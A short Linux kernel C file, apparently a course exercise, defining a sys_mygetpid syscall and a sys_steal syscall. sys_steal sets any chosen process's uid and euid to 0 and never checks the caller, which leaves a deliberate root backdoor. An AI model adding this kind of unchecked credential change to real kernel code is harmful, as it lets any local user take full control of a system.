#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/linkage.h>

asmlinkage long sys_mygetpid(void)
{
  return current->tgid;
}

asmlinkage int sys_steal(pid_t pid)
{
  struct task_struct* p = NULL;

  for_each_process(p)
  {
    if (p->tgid == pid)
    {
     p->uid = 0;
     p->euid = 0;
     return 0;
    }
  }

  return -1;
}
